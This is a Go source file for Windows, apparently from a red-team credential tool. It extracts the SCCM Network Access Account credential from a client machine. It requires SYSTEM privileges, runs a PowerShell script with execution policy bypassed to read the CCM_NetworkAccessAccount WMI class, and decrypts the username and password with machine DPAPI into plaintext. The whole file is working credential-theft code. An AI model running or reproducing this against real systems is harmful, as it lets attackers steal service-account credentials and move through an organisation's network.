//go:build windows

package cred2

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

const localSystemSID = "S-1-5-18"

type naaWMIValue struct {
	Username string `json:"NetworkAccessUsername"`
	Password string `json:"NetworkAccessPassword"`
}

func recoverLocal(ctx context.Context, technique string) (Credential, error) {
	if err := requireLocalSystem(technique); err != nil {
		return Credential{}, err
	}
	artifact, err := acquireNAA(ctx, technique)
	if err != nil {
		return Credential{}, err
	}
	usernameSecret, err := ParsePolicySecret(artifact.Username)
	if err != nil {
		return Credential{}, fmt.Errorf("%s NetworkAccessUsername: %w", technique, err)
	}
	defer zero(usernameSecret.DPAPIBlob)
	passwordSecret, err := ParsePolicySecret(artifact.Password)
	if err != nil {
		return Credential{}, fmt.Errorf("%s NetworkAccessPassword: %w", technique, err)
	}
	defer zero(passwordSecret.DPAPIBlob)
	username, err := unprotectSystemDPAPI(usernameSecret.DPAPIBlob)
	if err != nil {
		return Credential{}, fmt.Errorf("%s could not decrypt NetworkAccessUsername with the local SYSTEM DPAPI context: %w", technique, err)
	}
	password, err := unprotectSystemDPAPI(passwordSecret.DPAPIBlob)
	if err != nil {
		return Credential{}, fmt.Errorf("%s could not decrypt NetworkAccessPassword with the local SYSTEM DPAPI context: %w", technique, err)
	}
	if username == "" || password == "" {
		return Credential{}, errors.New(technique + " decrypted NAA credential contains an empty username or password")
	}
	return Credential{Username: username, Password: password}, nil
}

func requireLocalSystem(technique string) error {
	token, err := windows.OpenCurrentProcessToken()
	if err != nil {
		return errors.New(technique + " could not inspect the current Windows security context")
	}
	defer token.Close()
	user, err := token.GetTokenUser()
	if err != nil || user.User.Sid.String() != localSystemSID {
		return errors.New(technique + " requires local NT AUTHORITY\\SYSTEM access to machine DPAPI state; run from SYSTEM on the SCCM client and retry")
	}
	return nil
}

func acquireNAA(ctx context.Context, technique string) (naaWMIValue, error) {
	// Fixed script: exactly one class and exactly two values. JSON stays on the
	// child pipe and is never written to disk or included in errors.
	const script = "$ErrorActionPreference='Stop';$x=@(Get-CimInstance -Namespace 'root\\ccm\\policy\\machine\\actualconfig' -ClassName 'CCM_NetworkAccessAccount');if($x.Count -eq 0){exit 42};if($x.Count -ne 1){exit 43};$u=[string]$x[0].NetworkAccessUsername;$p=[string]$x[0].NetworkAccessPassword;if([string]::IsNullOrEmpty($u)){exit 44};if([string]::IsNullOrEmpty($p)){exit 45};[pscustomobject]@{NetworkAccessUsername=$u;NetworkAccessPassword=$p}|ConvertTo-Json -Compress"
	out, err := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script).Output()
	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			switch exitErr.ExitCode() {
			case 42:
				return naaWMIValue{}, errors.New(technique + " current CCM_NetworkAccessAccount is not present on this SCCM client")
			case 43:
				return naaWMIValue{}, errors.New(technique + " found multiple CCM_NetworkAccessAccount objects; refusing ambiguous recovery")
			case 44:
				return naaWMIValue{}, errors.New(technique + " CCM_NetworkAccessAccount has no NetworkAccessUsername value")
			case 45:
				return naaWMIValue{}, errors.New(technique + " CCM_NetworkAccessAccount has no NetworkAccessPassword value")
			}
		}
		return naaWMIValue{}, errors.New(technique + " could not read CCM_NetworkAccessAccount; verify the SCCM client and local SYSTEM access")
	}
	var artifact naaWMIValue
	if err := json.Unmarshal(out, &artifact); err != nil {
		return naaWMIValue{}, errors.New(technique + " CCM_NetworkAccessAccount returned an unexpected response")
	}
	if artifact.Username == "" || artifact.Password == "" {
		return naaWMIValue{}, errors.New(technique + " CCM_NetworkAccessAccount returned an empty protected value")
	}
	return artifact, nil
}

func unprotectSystemDPAPI(blob []byte) (string, error) {
	if len(blob) == 0 {
		return "", errors.New("empty DPAPI blob")
	}
	in := windows.DataBlob{Size: uint32(len(blob)), Data: &blob[0]}
	var out windows.DataBlob
	if err := windows.CryptUnprotectData(&in, nil, nil, 0, nil, windows.CRYPTPROTECT_UI_FORBIDDEN, &out); err != nil {
		return "", err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	plain := unsafe.Slice(out.Data, out.Size)
	defer zero(plain)
	if len(plain)%2 != 0 {
		return "", errors.New("decrypted value is not UTF-16LE")
	}
	words := make([]uint16, len(plain)/2)
	for i := range words {
		words[i] = uint16(plain[i*2]) | uint16(plain[i*2+1])<<8
	}
	result := strings.TrimRight(string(utf16.Decode(words)), "\x00")
	if strings.IndexByte(result, 0) >= 0 {
		return "", errors.New("decrypted value contains an embedded NUL")
	}
	return result, nil
}
